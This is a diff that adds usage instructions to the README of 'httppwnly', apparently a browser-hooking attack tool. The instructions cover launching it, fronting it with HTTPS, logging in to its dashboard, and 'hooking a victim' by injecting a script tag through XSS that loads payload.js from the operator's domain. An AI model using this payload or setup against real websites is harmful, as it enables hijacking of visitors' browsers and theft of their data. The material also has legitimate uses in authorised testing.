@@ -5,6 +5,20 @@
 ## Dependencies:
 pip install -r requirements.txt
 
+## Usage:
+to run the tool, simply use:
+```
+python httppwnly.py
+```
+For production usage, you should run and configure a reverse proxy which offers both HTTP on port 80 and HTTPS on port 443 with a properly signed SSL certificate. This is free and fairly straightforward with Lets Encrypt providing you own a domain. See "Reverse proxy" below for further info and a copy-paste nginx config.
+
+When you run httppwnly, a randomly generated password for the user "admin" will be displayed in the terminal. At this point, visit https://[yourdomain]/login in your browser. After logging in, you will have access to the /dashboard.
+
+In order to hook a victim, you should write the following script tag to a page via XSS:
+```
+<script id="hacker" src="//[yourdomain]/payload.js"></script>
+```
+
 ## Demo:
 [![Demo Video](http://img.youtube.com/vi/spfrmsbhBaw/0.jpg)](https://www.youtube.com/watch?v=spfrmsbhBaw "HttpPwnly Update Demo")
 
